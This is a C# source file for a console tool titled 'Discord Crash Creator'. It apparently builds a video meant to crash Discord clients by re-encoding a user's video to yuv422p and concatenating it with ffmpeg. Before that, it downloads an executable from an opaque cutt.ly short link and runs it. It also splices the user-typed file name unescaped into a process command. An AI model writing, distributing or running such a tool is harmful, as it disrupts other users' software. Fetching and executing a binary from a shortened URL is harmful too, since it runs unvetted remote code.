using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;
using Console = Colorful.Console;

namespace DiscordCrasher
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Discord Crash Creator - Made by UnknownModder#9869";
            Helpers.printLogo();

            //try { Process.Start(""); }
            //catch { Helpers.writePrefixText("err", "README.txt was not found! Please re-download!", true); }

            if(!File.Exists("ffmpeg.exe"))
            {
                Helpers.writePrefixText("inf", "Downloading FFMPEG..", true);
                using (WebClient MyWebClient = new WebClient())
                {
                    MyWebClient.DownloadFile("https://cutt.ly/LbCQa5k", "ffmpeg.exe");
                }
            }

            Console.Clear();
            Helpers.printLogo();

            Helpers.writePrefixText("inf", "name of the video file: ", false);
            var videoFile = Console.ReadLine();

            Process.Start("ffmpeg.exe", "-i " + videoFile + " -pix_fmt yuv422p -y converted.mp4");
            Thread.Sleep(1500);
            Process.Start("ffmpeg.exe", "-f concat -i test.txt -codec copy -y result.mp4");

            Console.WriteLine(string.Empty);
            Helpers.writePrefixText("win", "Your file has been created! (result.mp4)", false);

            Console.ReadLine();
        }
    }
}
